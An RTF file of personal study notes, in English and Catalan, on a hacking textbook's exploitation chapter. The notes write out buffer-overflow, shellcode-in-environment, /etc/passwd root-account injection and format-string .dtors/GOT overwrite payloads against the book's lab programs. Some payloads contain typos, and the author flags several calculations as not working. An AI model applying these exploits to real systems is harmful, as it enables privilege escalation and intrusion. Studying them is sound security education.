{\rtf1\ansi\ansicpg1252\cocoartf1138\cocoasubrtf470
{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 Times-Roman;}
{\colortbl;\red255\green255\blue255;}
\paperw11900\paperh16840\margl1440\margr1440\vieww10220\viewh9320\viewkind0
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural

\f0\fs34 \cf0 ================\
| 0x300 Exploitation |\
================\
\
\
programming errors\
	off by one: difference between fence posts and spaces between posts\
			count items  vs space between items\
			escollir  range of  N items entre M? \
\
	unicode expansion: increase of functionality  = > increase of complexity\
		 	IIS unicode support  vs  path-checking code\
\
0x310 Generalized Exploit Techniques\
==============================\
\
	execution of arbitrary code\
	throught mem corruption techniques\
\
	driving the execution flow off a cliff\
	but if environment is carefully controlled -> execution flow can ve controlled reprogramming the process\
\
0x320 Buffer Overflows\
==================\
\
	C assumes programmer is responsible for data integrity\
\
	put ten bytes of data into a buffer only allocated for 8 bytes -> buffer overrun , buffer overflow -> overwrite memory adjacent to the allocated buffer\
\
	overflow_example.c\
	\
		strcpy(buffer,argv[1]) copies the string with a 0 at the end\
				done by argv[1]? or by strcpy?\
\
		strlen(argv[1])= 28 -> illegal instruction\
			    =29 -> segmentation fault\
\
\
		pila:\
			buffer2 7e0 ( 8 bytes)\
			buffer1 7e8  (8 bytes)\
					(4 bytes)\
			value  7f4 (int -> 4 bytes)\
			--                (? bytes) 4 bytes de espai?? ->  o 2 byte de espai \
			EBP   (4 bytes)\
			return (4 bytes)\
	\
\
			amy 28 bytes (+ 0 a final ) ja se sobrescriue el EBP\
			i amb 29 (+0 al final) se sobrescriu el ret\
\
\
	notesearch.c \
\
			buffer overflow\
\
			notetaker -> chown root:root; chmod +s notetaker\
\
\
0x321 Stack-Based Buffer Overflow Vulnerabilities\
---------------------------------------------------------------------\
\
	auth_overflow.c\
\
		int auth_flag = 0\
		char Password_buffer[16];\
\
\
		overwriting password_buffer we can overwrite auth_flag\
\
	auth_overflow2.c 	\
\
		vars declared in reverse order, cannnot overwritte\
\
		\
\
	another variable that can be overwritten is the return address\
\
\
	Stack explanation\
\
		local vars (auth_flag, password_buffer)\
		(sometimes padding put by the compiler)\
		Saved Frame pointer (SFP or EBP)\
		Return address\
		Function arguments\
--------------------------------------------\
		main()'s frame pointer\
\
\
\
	padding, local vars, mo ??? \
\
	function calling mechanism\
\
	gcc option \
		-fomit-frame-pointer- -> frame pointer won't be used in the stack frame\
\
	CALLING mechanism , variant:\
		mov DWORD PTR [esp], eax --> instead of push\
		call 0x8048414 <check_auth>\
	push without incrementing ESP (so overwrite the top of the stack)\
		leave and ret instruccions to restore EIP exiting a call\
\
0x330 experimenting with BASH\
=========================\
\
\
	Perl:\
		perl -e 'print "A" x 20;'\
\
		non-printable chars can be used with \\x## \
		perl -e 'print "\\x41" x 20,'\
\
		concatenation\
		perl -e 'print "A"x20 . "BCD" . "\\x61\\x66\\x67\\x69"x2 . "Z";'\
\
		shell command with $()\
		$(perl -e 'print "uname";')\
		una$(perl -e 'print "m";')e\
\
		shell with grave accent marks `\
		una`perl -e 'print "m";'\'e8\
\
\
		./overfow_example $(perl -e 'print "A"x20 . "\\xef\\xbe\\xad\\xde";')\
\
\
	auth_overflow2.c\
		exploiting return address to gain access\
\
		(gdb)run $(perl -e 'print "A"x28 . "\\xbf\\x84\\x04\\x08";')\
\
		access granted , artificialment pq l'adressa l'he llegida del gdb\
\
\
		artificial pero mes f\'e1cil\
		./auth_overflow2 $(perl -e 'print "\\xbf\\x84\\x04\\x08"x10')\
		es repeteix l'adre\'e7a de retorn ALINEADA en tot el buffer i algun caura just al return address\
\
	exploit_notesearch.c p 137\
\
		term SHELLCODE	\
\
		suid root, and a strcpy buffer overflow -> \
\
\
		Technique 1: repeated return address \
		Technique 2: NOP sled to the shellcode (before the shellcode)  \
\
		NOP sled |  ShellCode | Repeated Return address\
\
\
		Technique 3: find approximate location of the buffer \
				use a nearby stack location as a frame of reference HOW???\
				in this case unsigned int i variable in main()\
				and subtract an offset from this location\
				->offset determined experimentaly\
\
\
	BASH\
		$seq 1 10    --> 1 to 10\
		$seq 1 3 10 -> 1 to 10 incrementing 3\
		\
		$for i in $(seq 1 3 10)\
		>do\
		>echo The value is $i\
		>done\
	\
\
		there's a room of 60 bytes (NOP sled is 60 bytes long) incrementing 30 we won't miss\
\
		$for i in $(seq 1 30 400); do  echo Trying offset $i; ./exploit_notesearch $i; done\
		\
		$for i in $(seq 1 30 400)\
		> do\
		> echo Trying offset $i\
		> ./exploit_notesearch $i\
		> done\
\
0x331 Using The Environment\
-----------------------------------------p156 -142\
\
	If buffer is too small to hold shell code -> environment variables can hold it!!\
	environment variables are LOCATED ON THE STACK at the bottom\
\
	$ export MYVAR =test\
	$ echo $MYVAR\
	test\
	$ env \
	\'85\
	list of environment variables\
	\'85\
\
	putting shell code in env variable\
	- - - - - - - - - - - - - - - - - - - - - - - - - - \
\
		for i in $(head exploit_notesearch.c | grep "^\\"" | cut -d\\" -f2)\
		>do\
		>echo -en $i\
		>done > shellcode.bin\
\
		$ hexdump -C shellcode.bin\
\
		Explanations:\
			cut -d -> cut by delimiters , in this case " represented by \\"\
			-f2 -> show only the field number 2\
				so field1 "  field2 " field 3\
\
				(-f3 shows ; from the last line which end with ";)\
\
			echo -en\
				-n do not output trailing newline\
				-e enable interpretation of backlash escapes\
\
			hexdump -C formato offset, hex , string\
\
\
		PUT into SHELLCODE env variable wiTH NOP SLED\
		 export SHELLCODE=$(perl -e 'print "\\x90"x200')$(cat shellcode.bin)\
\
\
	Now finding an approximate location into the Nop sled\
	- - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - -- - - - - - -p144\
		env variables near the bottom of the stack\
		set env var (export ,etc) and run program with gdb and examine memory\
		x/24s $esp + 0x240 -> to find the aproximate memory address of the env var (nop sled and shellcode)\
		running gdb modifies slightlt the mem addresses but 200 bytes of NOP Sled\'85\
\
	Environment variable location prediction (NOP sled not needed)\
	- - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - -- - - - - - - - - - \
	getenv()\
\
	getenv_example.c\
		print the memory address of an environment var\
\
		./getenv_example SHELLCODE\
		0xbffff90b\
		./notesearch $(perl -e 'print "\\x0b\\xf9\\xff\\xbf"x40')\
		WORKS BECAUSE THERE'S A NOP SLED\
\
\
	program name has influence in memory address of env vars\
	mem address varies by program name\
		>cp ./getenv_example ./a\
		>cp ./getenv_example ./aa\
		>cp ./getenv_example ./bcd\
		>cp ./getenv_example ./zzzz\
		>./a SHELLCODE\
		SHELLCODE is at 0xbffff932\
		>./aa SHELLCODE\
		SHELLCODE is at 0xbffff930\
		>./bcd SHELLCODE\
		SHELLCODE is at 0xbffff92e\
		>./zzzz SHELLCODE\
		SHELLCODE is at 0xbffff92c\
\
	getenvaddr.c p 147\
		pointer = getenv(env var name) + (strlen(getenvaddr.c) - strlen(target program))*2\
		every char added in the program name substracts 2 in the mem address\
		\
\
		export SLEDLESS=$(cat shellcode.bin)\
		./getenvaddr SLEDLESS notesearch\
		>SLEDLESS will be at 0xbfffff4b\
		./notesearch $(perl -e 'print "\\x4b\\xff\\xff\\xbf"x40')\
		sh-3.2#\
\
	Using execle() function and env vars\
	- - - - - - - -- - - - - - - - - - - - - - - - - - -\
		execl() and execle() replace the current process with a new one\
		function arguments\
			1-path to target program\
			2-argv[0] param (name of the program)\
			3-argv's\
			n-NULL to terminate the argument list\
\
\
		execle()\
			1-path to target program\
			2-argv[0] param (name of the program)\
			3-argv's\
			n-NULL to terminate the argument list ??\
			env-array of pointers for each env var to null-terminated strings, and a NULL pointer at the end\
\
		in Linux if only one env var , its address is:\
			0xbffffffa - length of the env var - length of the name of the executed program\
			SO ITS AN EXACT ADDRESS\
\
		exploit_notesearch_env.c\
\
			shellcode[] = "\'85."\
			char *env[2] = \{shellcode, 0\}			\
\
			ret = 0xbffffffa - (sizeof(shellcode) -1 ) - strlen("./notesearch");\
	\
			buffer is fiiled with ret, 160/4 times\
\
			execle("./notesearch", "notesearch", buffer, 0 , env);\
			free(buffer)\
\
\
Resum final stack-based overflow + BASH and PERL\
------------------------------------------------------------------\
	0-ibjection: NOP sled | shell code | address to NOP sled x N times\
	1-offset from an inside/local variable \
	2-environment variable (export MYVAR=)  + NOP sled very large + approximate memory address of env var (using GDB)\
	3-environment variable without NOP sled and precise memory address (getenv() + name of program running algorithm calculation)\
	4-environment var + execle() ( no NOP SLED, precise mem address)\
\
0x340 Overflows in Other Segments\
=============================\
\
	important varaible located after a buffer vulnerable to an overflow\
		control flow can be altered\
\
	0x341 A basic Heap-Based Overflow\
	-----------------------------------------------\
\
		notetaker.c , datafile var can be overwritten\
\
		notetaker $(perl -e 'print "A"x104 . "B"x6')\
		\'85 \
		datafile : 'BBBBBB'\
		\'85.\
\
		-error because corruption of heap headers\
		heap headers introduced to fight heap unlinking attacks,  glibc 2.2.5\
\
		-suid root so can write to /etc/passwd\
\
		-password field contains x instead of password (password encrypted on /etec/shadow)\
		but this field can contain the encrypted password!\
\
		-user ID 0 means root privileges\
\
		name of the file is written in the end of the "note"\
			note = entry in the /etc/passwd defining a new user\
			\
			like:\
			root:x:0:0:root:/root:/bin/bash\
\
			1-backup of /etc/passwd\
			2- entry will contain the name of the file at the end, so will containt /etc/passwd, so combine with /tmp/ and soflink from /tmp/etc/passwd to /bin/bash\
				ln -s target linkname\
				sudo ln -s /bin/bash /tmp/etc/passwd \
\
			3- perl -e 'print crypt("password", "AA")."\\n"'\
					use the crypt to fill the password field in /etc/passwd\
\
			4-perl -e 'print crypt("password","XX")' > mypassword.txt\
			5- echo $(perl -e 'print "myroot:"')$(cat mypassword.txt)$(perl -e 'print ":0:0:myroot:/root:/tmp"') | wc -m\
				43 chars\
\
				so 104 - 43 = 61\
				"A"x61. all the stuff above + ending with /etc/passwd\
\
				error -> "A"x62\
				error2 -> put "A"x62 in the field Long Name\
\
			6-./notetaker $(perl -e 'print "r00t:"')$(cat mypassword.txt)$(perl -e 'print ":0:0:myroot" . "A"x64 . ":/root:/tmp7etc/passwd"') \
\
	0x341 Overflowing Function Pointers\
	----------------------------------------------\
\
		prova game_of_chance.c overflow function pointer\
\
		struct user \{\
\
			int uid;\
			int credits;\
			int highscore;\
			char name[100];\
			int (* current_name)();\
\
		\}\
\
		\
		1-if last_game = x and you pick x, the function pointer isn't changed \
		so play game x, press 5 and change the name and overflow the funciton pointer, and then play the same game x so function pointer is not changed.\
\
		2-but how to introduce correct values??? how to escape the string??\
			no way to do that\
			only way: ctrl +z, pause program. generate with perl, copy , then fg, then paste\
\
		3- Mac OS x -> right click menu =  "CMD" + Click, \
\
		4-(gdb) p player --> prints the struct with names of fields\
		(gdb) x/x &player.current_game\
\
		5- nm game_of_chance -> shows lists symbols in object files\
				with debug info right????\
				gcc -o game game_of_chance.c\
				nm game -> the function names still shown\
\
			jackpot: 08048d70\
\
		6-keyboard presses typed\
			perl -e 'print "1\\n7\\nn\\n7\\n"' | ./game_of_chance\
\
		7-final exploit\
			perl -e 'print "6\\n1\\n10\\nn\\n5\\n" . "A"x100 . "\\x70\\x8d\\x04\\x08\\n" . "1\\ny\\ny\\ny\\nn\\n1\\ny\\ny\\nn\\n7\\n"' | ./game_of_chance\
\
		Ok we can win as many credits but\
\
		FUNCTION POINTER means we can make eip jump to anywhere\
			-> shellcode\
\
		export SHELLCODE=$(cat ./shellcode.bin)\
		./getenvaddr SHELLCODE ./game_of_chance\
		0xbffff9e0\
		perl -e 'print "1\\n10\\nn\\n5\\n" . "A"x100 . "\\xe0\\xf9\\xff\\xbf\\n" . "1\\n"'  > exploit_buffer\
		cat exploit_buffer - | ./game_of_chance\
\
		cat exploit_buffer - |  --_> the dash "-" tells the cat program to send standard input after sending the exploit buffer, so when root shell expanded, it continues to receive standard input.\
		\
\
0x350 Format Strings\
=================p181 167\
\
		not very common anymore, but can be used in other situations\
\
	0x351 Format Parameters\
	----------------------------------\
		printf() family functions\
		evaluates the format string and performs an action when parameters is found\
\
		%s %d %u %x %c %n\
\
		each format parameter expects an additional var to be passed\
	\
		%n number of bytes written so far\
		fmt_uncommon,c\
		\
			%n writes to the &variable (passed as a pointer) the number of chars written so far (so far in the format string)	\
		\
			REMARK  1-> can write to memory address!!\
\
			stack 's role with format strings\
				--- top ---\
				address of format string\
				value of A\
				Address of A\
				value of B\
				--- bottom ---\
\
			when removing an argument from the params -> work the same way\
			-> so prints som part of the stack even if no parameter there\
\
\
			sed usage\
				sed -e 's/< expression to replace>/<replacement>/' fmt_uncommon.c < fmt_uncommon2.c\
\
			REMARK  2-> we can inspect the memory with a missing parameter in a format string call\
\
\
	0x352 The Format String Vulnerability\
	------------------------------------------------\
\
		using printf(string) instead of printf("%s",string)\
\
		fmt_vuln.c\
			./fmt_vuln $(perl -e 'print "%08x."x40')\
\
			REMARK -> as long as the format string is stored in the stack it will be located below the current frame pointer (higher memory addresses)\
			??\
			useful if format parameters that pass by reference are used\
\
	0x353 Reading from Arbitrary Memory Addresses\
	---------------------------------------------------------------\
\
		supply a format string with % params and also with values or men addresses\
		\
		fmt_vuln AAAA%08x.%08x.%08x.%08x\
		prints:\
		AAAAbffff3d0.b4fffdf.00000000.41414141\
\
		now changing %x to %s will read from the memory address 41414141\
		so if a valid men address is supplied\'85\
\
		>env | grep PATH\
		>./getenvaddr PATH ./fmt_vuln\
		0xbffffdd7\
		>./fmt_vuln $(printf "\\xd7\\xfd\\xff\\xbf")%08x.%08x.%s\
		--> shows the PATH env var\
\
\
		1- find the distance between the end of the stack frame and the format string parameter\
		2- put as many field with arguments to read through the stack \
		3- finally %s when the format string parameter is reached\
		4- in the format string can be any memory address\
\
		5- memory addresses in strings: little endian + \\xbf hexadecimal format\
\
\
	0x354 Writing to Arbitrary Memory Addresses\
	---------------------------------------------------------p187 173\
			\
			fmt_vuln.c prova de sobreescriure la variable amb %n\
\
			1-./fmt_vuln $(printf "AAAA")%08x_%08x_ \'85\
				tants %08x_ com fagi falta , fins a trobar en la sortida del programa un 41414141\
				resultat 4 %08x_ per trobar la format string dins del stack\
			\
			2-	quant ja tenim el num de %08x_, el ultim es canvia per un %n\
				./fmt_vuln $(printf "AAAA")%08x_%08x_%08x_%n\
					->Segmentation fault pq intenta escriure a l'adre\'e7a 41414141\
\
			3-	posar al printf l'adre\'e7a de memoria on es vol escriure, en aquest cas 0x08049794\
				./fmt_vuln $(printf "\\x94\\x97\\x04x08")%08x_%08x_%08x_%n\
				->ara escriura el valor 31\
					aixo es: 4 per "\\x94\\x97..", 9 per cada %08_ = 27 = 31\
				\
			4-  quins valors podre escriure?\
				minim es ./fmt_vuln $(printf "\\x94\\x97\\x04x08")%c_%c_%c_%n \
				escriu 10, perque? perque els parametres s'apilen i pertant si es un char de 2 bytes estara en un espai de 4bytes???\
						./fmt_vuln $(printf "\\x94\\x97\\x04x08")%d_%d_%d_%n\
				escriu 30\
						./fmt_vuln $(printf "\\x94\\x97\\x04x08")%x_%x_%x_%n\
\
				valor maxim\
						./fmt_vuln $(printf "\\x94\\x97\\x04x08")%116x_%x_%x_%n\
				escriu 116\
\
		->./fmt_vuln $(printf "\\x94\\x97\\x04x08")%08x_%08x_%08x_\'85 AS %x AS NEEDED TO FIND THE BEGINNING OF THE FORMAT STRING IN THE STACK ..%n\
\
		->controlling the blank spaces with a %200x or %400x, WORKS FOR SMALL NUMBERS\
\
\
		LARGER NUMBERS\
		. . . . . . . . .. . . . . . . . \
\
		1->won't work for men addresses or larger numbers\
			->SOLUTION, different writes to \\x94\\x97\\x04x08, \\x95\\x97\\x04x08, \\x96\\x97\\x04x08, \\x97\\x97\\x04x08\
				WE HAVE THE 4 BYTES WRITTEN\'e7\
				p188 174\
		\
			./fmt_vuln $(printf "\\x94\\x97\\x04x08\\x95\\x97\\x04x08\\x96\\x97\\x04x08\\x97\\x97\\x04x08")%x%x%x%n%n% n%n\
			result: written 0x21212121\
\
		./fmt_vuln $(printf "\\x94\\x97\\x04x08\\x95\\x97\\x04x08\\x96\\x97\\x04x08\\x97\\x97\\x04x08")%x%x%x%n%n%_$(perl -e 'print "A"x220')_ n%n\
		result written 0xffff2121\
\
\
		2-trying to write a valid men address (podria ser util)\
		cal canviar el ordre dels bytes escrits\
		per exemple per escriure 0xbffffe50\
		ordenar bytes -> 50 bf fe ff\
						1  4   2  3\
					       \\x94  \\x97 \\x95 \\x96\
		PROBLEMA\
				escriure a el byte \\x94\\x97\\x04x08 sobreescriura els 4 seguents pq estem escrivint amb %n que escriu un unsigned int o in (4 bytes), per tant no funciona ordenar\'85\
			ESCRIU 4 BYTES EL %n, per tant escriure el byte \\x94 sobreescriu tambe el \\x95, el \\x96 i el \\\uc0\u8721 97\
\
		PALIATIU\
			nomes es poden escriure addresses que tinguin els digits decreixents o iguals??\
			0xDDDDCCCC, 0x99999999, 0xFFEEDDCC 0xDDCCBBAA 0xffffffff\
				\
\
		3-IDEA MEVA\
			ESCRIURE mes de 255 caracters fa overflow del byte\
			pertant per ordre, i fent us del overflow\
		\
 		./fmt_vuln $(printf "\\x94\\x97\\x04x08\\x95\\x97\\x04x08\\x96\\x97\\x04x08\\x97\\x97\\x04x08")%x%x%x$(perl -e 'print "A"x222')%n%n%$(perl -e 'print "A"')n%n		\
			\
			resultat: 0x0000ffff\
\
			per escriure 0xbffffe50\
			\
		./fmt_vuln $(printf "\\x94\\x97\\x04x08\\x95\\x97\\x04x08\\x96\\x97\\x04x08\\x97\\x97\\x04x08")%x%x%x$(perl -e 'print "A"x47')%n$(perl -e 'print "B"x174')%n%$(perl -e 'print "C"')n$(perl -e 'print "D"x192')%n	\
		\
\
		4-IDEA LLIBRE\
\
			1- write to each byte of the 4 byte int var overwritten, -> %nx4\
			2-adjust values written by %n  with JUNK and %NNx%n for each byte (%x reads from the beginning of the format string = beginning of format string has mem addresses (to be passed to %n) and 4 byte strings (to be passed to %x)\
			3-wrapping around, or overflowing to write lower digit values to more significant bytes of the address\
			4- %02x limitation: %2x -> minimum, so if the number represented has more than 2 digits, it will write them.so wrap around or overflow\
\
			%n writes 4 bytes (writes an unsigned int) or int\
\
		finalment:\
		./fmt_vuln $(printf "\\x94\\x97\\x04x08JUNK\\x95\\x97\\x04x08JUNK\\x96\\x97\\x04x08JUNK\\x97\\x97\\x04x08" )%x%x%161x%n%222x%n%91x%n%258%n	\
\
\
		gdb -q --batch -ex "p 0xaa - 52 + 8"\
\
\
\
	0x355vDirect Parameter access\
	----------------------------------------\
\
		%n$d  would access the nth parameter and display it as decimal number\
\
		>./fmt_vuln AAAA%a\\$x\
	\
\
		Apliquem a la idea de l'apartat anterior\
		./fmt_vuln $(printf "JUNK\\x94\\x97\\x04x08JUNK\\x95\\x97\\x04x08JUNK\\x96\\x97\\x04x08JUNK\\x97\\x97\\x04x08" )%4\\$138x%5\\$n%6\\$17x%7\\$n%8\\$103x%9\\$n%10\\$239%11\\$n\
\
		OBSERVACIO: cal posar el num de parametre %<num>\\$ sempre, sino torna a comen\'e7ar o algu aixi\
\
		OBS2: \\$ per escriure-ho a la shell, escaping de interpretar $ coma  caracter especial\
\
		OBS3 : SIMPLIFICACIO, els %x llegeixen de mem i son per omplir -> no cal posar JUNK, posant %x es llegira de la primera adre\'e7a del stack pero ja no importa. Pertant\
		./fmt_vuln $(printf "\\x94\\x97\\x04x08" . "\\x95\\x97\\x04x08" . "\\x96\\x97\\x04x08" . "\\x97\\x97\\x04x08" )%98x%4\\$n%139x%5\\$n%258x%6\\$n%192%7\\$n\
		>test_val = 0xbffffd72\
\
\
	0x356 Using short Writes\
	--------------------------------\
\
		%hn  escriu a un short int (2 bytes)\
		%hd, %hx  representen decimal i hexa de 2bytes\
\
	escriurem de 2 bytes en 2 bytes\
\
	volem escriure 0xbffffd72\
\
	./fmt_vuln $(printf "\\x94\\x97\\x04\\x08\\x96\\x97\\x04\\x08")%64874x%4\\$hn%49805x%5\\$hn\
\
\
	per simplificar escriure primer el \\x96 short\
\
		./fmt_vuln $(printf "\\x96\\x97\\x04\\x08\\x94\\x97\\x04\\x08")%49143x%4\\$hn%15731x%5\\$hn\
\
\
	REMARK:  es pot escriure qualsevol adre\'e7a de mem amb les format string vulns\
		no nomes la return address, a mes hi ha altres adre\'e7es mes predictibles.\
\
\
	0x357 Detours with .dtors\
	--------------------------------p198 184\
\
		binary programs compilats amb el GNU compiler\
			special table section called .dtors and .ctors (destructors and constructors). \
\
			aquestes seccions contenen funcions que es cridaran abans del main() (per les constructors) i despres del main() (per les destructors)si surt amb una exit system function call\
\
\
	dtors_sample.c\
		\
		static void cleanup(void) __attribute__ ((destructor));\
\
\
	.dtors table section:\
\
		array of 32-bit addresses, beginning with 0xffffffff and terminated by a NULL address\
\
\
	nm command\
		nm ./dtors_sample\
			address of cleanup 0x80403e8\
			address of DTOR_LIST 0x80495ac\
			address of DTOR_END 0x80495b4\
	objdump command\
		objdump -s -j .dtors ./dtors_sample\
\
		-s show source intermixed with assembly\
		-j <section name>  = show section <section name>\
\
		address of the section:  bytes in groups of 4 (little endian, so reversed because bytes shown not dwords)\
\
\
	.dtors section is writable\
	objdump -h ./dtors_sample \
		(show headers), dtors not labeled READONLY\
\
	Every GNU compiled program has .dtors -> fmt_vuln.c has it\
	nm ./fmt_vuln \
	objdump -s -j .dtors ./fmt_vuln\
		but has no spaced between 0x0000000 and 0xffffffff\
\
	exploitation\
	. . . . . . . . . .\
\
		>objump -s -j .dtors ./fmt_vuln\
		8049690 ffffff 00000000 \'85\
			--> so at 0x8049694 is the 0x00000000 which must be overwritten\
		>export SHELLCODE=$(cat shellcode.bin)\
		>./getenvaddr SHELLCODE ./fmt_vuln\
		(>./getenvaddr SHELLCODE2 ./fmt_vuln)\
		0xbffffe45\
		>./fmt_vuln $(printf "\\x94\\x96\\x04\\x08\\x96\\x96\\x04\\x08")%66666x%4\\$hn%44444x%5\\$hn\
			--> no puc veure el resultat numeric i pertant no puc calcular com esciure l'adre\'e7a de mem 0xbffffe45\
			--> escriure primer al test_val i despres a la adre\'e7a .dtors + 1Dword\
\
			gdb --batch -ex "p 0xfe45 - 0x0010 + 8 " = 65085\
			gdb --batch -ex "p 0xbfff -\
\
		>/fmt_vuln $(printf "\\x94\\x96\\x04\\x08\\x96\\x96\\x04\\x08")%65085x%4\\$hn%49594x%5\\$hn\
\
		->ok!! pero em surt whoami : reader!!\
			(si el poso chown root:root i suid  llavors es root la shell\'85)\
\
	0x358 Another Notesearch Vulnerability p 203 - 189\
	---------------------------------------------------------------------\
\
		1-find vuln (printf(String))\
			if (serach_note(note_buffer, searchstirng)) <-----comes from saved note\
				printf(note_buffer); <-------------vuln!!!\
		2-find parameter placement from format string\
			>./notetaker BBBB.%x.%x.%x.%x\
			>./notesearch BBBB\
				BBBBbfffff640 .28.0.0\
			>./notetaker BBBB.%x.%x.%x.%x.%x.%x.%x.%x\
			>./notesearch BBBB\
				BBBBbfffff640 .28.0.0.0.0.1.42424242\
			--> 8\'e8 par\'e0metre es el format string\
\
\
		3- dtors???\
			>objdump -s -j .dtors ./notesearch\
			08049c5c ffffffff 00000000\
				--> escriure a 0x08049c60\
\
		4-getenvaddr\
			>./getenvaddr SHELLCODE2 ./notesearch\
				0xbffffe41\
\
		5-com veure calcul adre\'e7a?\
			>./notetaker $(printf "\\x60\\x9c\\04\\08\\x62\\x9c\\x04\\x08")%x%8\\$hn%x%9\\$hn\
				n'hi ha 16 chars entre el printf "\\x\'85" i el %x (pq el primer param surt una dresa de mem de 8 digits pertant\
			>gdb --batch -ex "p 0xfe41 - 16" \
				65073\
			>gdb --batch -ex "p 0xbfff -16 -65073" \
				-15938\
				->CALCULAR AMB OVERFLOW/WRAP AROUND\
			>gdb --batch -ex "p 0x1bfff -16 -65073" \
				49598\
\
			>./notetaker $(printf "\\x60\\x9c\\04\\08\\x62\\x9c\\x04\\x08")%65073x%8\\$hn%49598x%9\\$hn\
\
\
			CALCUL NO EM FUNCIONA\
\
		6-escriure a una env var\
			export MYENVVAR=1\
			echo $MYENVVAR\
		(pero es una string\'85)\
		\
				./getenvaddr MYENVVAR ./notesearch\
				0xbffffa36\
\
\
		7-TORNEM A CONTAR\
		 hi ha 12 chars entre el printf "\\x\'85" i el %x (ho he provat fent un:\
			>./notetaker $(printf "\\x60\\x9c\\04\\08\\x62\\x9c\\x04\\x08")%x\
			>./notesearch \
				->contant a ull -> 12 chars\
			>gdb --batch -ex "p 0xfe41 - 12" \
				65077\
			>gdb --batch -ex "p 0xbfff -12 -65077" \
				-15938\
				->CALCULAR AMB OVERFLOW/WRAP AROUND\
			>gdb --batch -ex "p 0x1bfff -12 -65077" \
				49598\
			>./notetaker $(printf "\\x60\\x9c\\04\\08\\x62\\x9c\\x04\\x08")%65077x%8\\$hn%49598x%9\\$hn\
			>./notesearch \
				Segmentation Fault\
\
\
			primer el byte \\x62\
			. . . . . . . . . . . . . . . \
			>gdb --batch -ex "p 0xbfff - 12" \
				49139\
			>gdb --batch -ex "p 0xfe41 -12 -49139" \
				15938\
			> sudo nano /var/notes --> borrar anterior nota\
			>./notetaker $(printf "\\x60\\x9c\\04\\08\\x62\\x9c\\x04\\x08")%49139x%9\\$hn%15938x%8\\$hn\
			>./notesearch \
				\
\
				error no son 12, son 8\'85 perque??? com ho conto???nomes contar el printf "\\x\'85" que son 8 bytes?\
\
\
	0x359 Overwriting the Global Offset Table\
	--------------------------------------------------------p205 190 \
\
		Procedure linkage Table	 PLT \
			TABLE REFERENCING all the shared functions of a library ?(IAT or Imports table?)\
		each time a shared function is called -> control passes through the PLT and a jump redirects to the function\
\
		>objdump -d -j .plt ./fmt_vuln\
\
\
		there's a jump for the exit@plt\
			if overwritten ----> redirecto to a shellcode!\
		but plt is readonly\
		\
		closer examination:\
			the jumps use pointers\
			jmp  *0x804977c\
\
			pointing to mem addresses where there's the address to jump to\
\
			These mem addresses are placed in the GOT which is writable!\
			Global Offset Table\
\
			examining the dynamic relocations table with objdump\
			objdump  -R ./fmt_vuln\
\
\
		exploitation\
		\'85\'85\'85\'85-\'85\
\
				objectiu exit() function\
\
			>objump -R  ./fmt_vuln\
					08049784 is the address of exit() which must be overwritten\
		>export SHELLCODE=$(cat shellcode.bin)\
		>./getenvaddr SHELLCODE ./fmt_vuln\
		(>./getenvaddr SHELLCODE2 ./fmt_vuln)\
		0xbffffe45\
			gdb --batch -ex "p 0xfe45 - 0x0010 + 8 " = 65085\
			gdb --batch -ex "p 0xbfff -\
\
		>/fmt_vuln $(printf "\\x84\\x97\\x04\\x08\\x86\\x97\\x04\\x08")%65085x%4\\$hn%49594x%5\\$hn\
\
		or the other techmique:\
			h  short bytes\
			not wrapping around/overflowing write lower byte firts (bffff before fe41 for example) so second short written first\
\
\
			GOT is fixed by binary, so another system with the same binary will have the same GOT entry at the same address\
\
\
		
\f1\fs26 The ability to overwrite any arbitrary address opens up many possibilities for exploitation. Basically, any section of memory that is writable and contains an address that directs the flow of program execution can be targeted.
\fs24 \
}